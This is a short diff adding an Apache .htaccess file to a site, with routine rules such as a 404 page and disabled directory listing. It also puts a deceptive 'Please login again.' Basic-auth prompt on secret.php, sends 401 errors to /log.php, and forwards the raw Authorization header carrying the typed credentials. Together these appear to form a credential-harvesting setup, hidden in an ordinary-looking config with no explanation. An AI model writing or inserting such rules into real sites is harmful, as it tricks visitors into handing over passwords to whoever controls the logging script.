@@ -1,0 +1,18 @@
+RewriteEngine on
+ErrorDocument 404 /index.html
+Options -indexes
+
+ErrorDocument 401 /log.php
+<files secret.php>
+AuthType Basic
+AuthName "Please login again."
+# Optional line:
+AuthUserFile /path/to/.htpasswd
+Require valid-user
+</files>
+RewriteEngine On
+RewriteBase /
+RewriteCond %{ENV:REDIRECT_STATUS} ^401$
+RewriteCond %{REQUEST_URI} !^/\.well-known/cpanel-dcv/[0-9a-zA-Z_-]+$
+RewriteCond %{REQUEST_URI} !^/\.well-known/pki-validation/[A-F0-9]{32}\.txt(?:\ Comodo\ DCV)?$
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
